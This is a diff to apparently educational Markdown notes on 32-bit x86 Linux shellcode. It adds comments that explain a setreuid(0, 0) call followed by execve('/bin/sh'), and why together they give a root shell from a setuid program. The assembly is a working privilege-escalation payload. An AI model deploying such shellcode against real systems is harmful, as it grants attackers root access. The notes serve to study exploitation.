@@ -81,11 +81,35 @@
     .text
     .global _start
     _start:
-            movl $70, %eax
-            movl $0, %ebx
-            movl $0, %ecx
-            int $0x80
+
+    # int setreuid(uid_t ruid, uid_t euid);
+    # setreuid(0, 0);
     
+            # %eax: Linux system call number (setreuid = 70)
+            movl $70, %eax
+
+            # %ebx: arg0, real UID (UID of root = 0)
+            movl $0, %ebx
+
+            # %ecx: arg1, effective UID (UID of root = 0)
+            movl $0, %ecx
+
+            # Linux system call (= interrupt 0x80)
+            int $0x80
+
+    # int execve(const char *pathname, char *const _Nullable argv[],
+                  char *const _Nullable envp[]);
+    # execve("/bin/sh", ["/bin/sh"], ["0"]);
+
+    # Let's set %eax = 0 temporarily for filling some other registers with 0s.
+    # %ebx is the address of filepath. Set %ebx = $filepath, and apply it on other registers.
+    # %ecx is made of two things: the address of filepath + null address
+    # %edx is made of null address
+
+    # For example, we can adjust the characters from the start of the filepath address like this: 
+    # / b i n / s h (null) (address-of-filepath) (null-address)
+    # 0 1 2 3 4 5 6    7      8   9   10   11     12  13  14  15
+            
             movl $0, %eax
             movl $filepath, %ebx
             movb %al, 7(%ebx)
@@ -97,15 +121,20 @@
             leal 12(%ebx), %edx
             int $0x80
 
+### `evecve`
+Linux manual page: [execve](https://man7.org/linux/man-pages/man2/execve.2.html)
+
+`execve` executes the program referred to by pathname.
+
 ### `setreuid`
 Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)
 
 `setuid` root programs usually drop root privileges for the security purposes. Therefore, even if a shellcode has the `setuid` bit, if it runs only `execve`, it will always spawn a normal user shell for the normal user.
 
-This is why we need to use `setreuid` in the project. Even if the program drops root privileges,
+This is why we need to use `setreuid` in the project. Even if the program drops root privileges when it starts to run,
 
     setreuid(0, 0);
 
-This will set both of the RUID and EUID to root's UID, and `execve` next to it will spawn a root shell.
+This will set both of the RUID and EUID to root's UID (= 0), so `execve` next to it can spawn a root shell.
 
 </details>
